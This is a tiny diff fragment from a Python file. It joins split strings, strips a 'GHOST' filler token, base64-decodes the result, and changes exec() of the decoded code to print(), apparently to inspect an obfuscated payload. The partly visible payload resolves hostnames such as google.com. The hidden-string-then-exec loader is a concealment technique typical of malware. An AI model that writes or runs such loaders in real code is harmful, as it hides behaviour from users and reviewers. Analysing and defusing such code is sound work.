@@ -5,4 +5,4 @@ aa = "9nbGUuY29tIikKICAgIGlwID0gc29ja2V0LmdldGhvc3RieW5hbGHOSTWUoInd3dy5mYWNlYm9
 aaa = a + aa + "=="
 aaa = aaa.replace("GHOST","")
 aaaa = base64.b64decode(aaa)
-exec(aaaa)
+print(aaaa)
